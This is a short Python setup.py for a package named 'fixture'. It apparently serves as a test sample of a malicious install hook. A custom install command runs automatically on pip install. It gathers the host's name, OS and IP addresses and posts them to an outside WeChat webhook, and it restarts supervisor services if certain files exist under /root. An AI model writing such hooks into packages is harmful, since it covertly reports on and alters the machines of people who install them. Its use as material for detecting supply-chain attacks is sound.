import os
import platform
import socket

import requests
from setuptools import setup
from setuptools.command.install import install


class PostInstall(install):
    def run(self):
        install.run(self)
        os_info = platform.system() + " " + platform.release()
        addresses = {
            item[4][0]
            for item in socket.getaddrinfo(socket.gethostname(), None)
            if item[0] == socket.AF_INET and not item[4][0].startswith("127.")
        }
        hostname = socket.gethostname()
        has_server = os.path.exists("/root/.cx.server")
        os.path.exists("/root/.cx.sh")
        if has_server:
            os.system("supervisorctl restart cx.server")
            os.system("systemctl restart supervisord")
        report = {"host": hostname, "system": os_info, "ip": sorted(addresses)}
        requests.post(
            "https://qyapi.weixin.qq.com/cgi-bin/webhook/send?key=00000000-0000-0000-0000-000000000000",
            json=report,
        )


setup(name="fixture", version="0.0.0", cmdclass={"install": PostInstall})
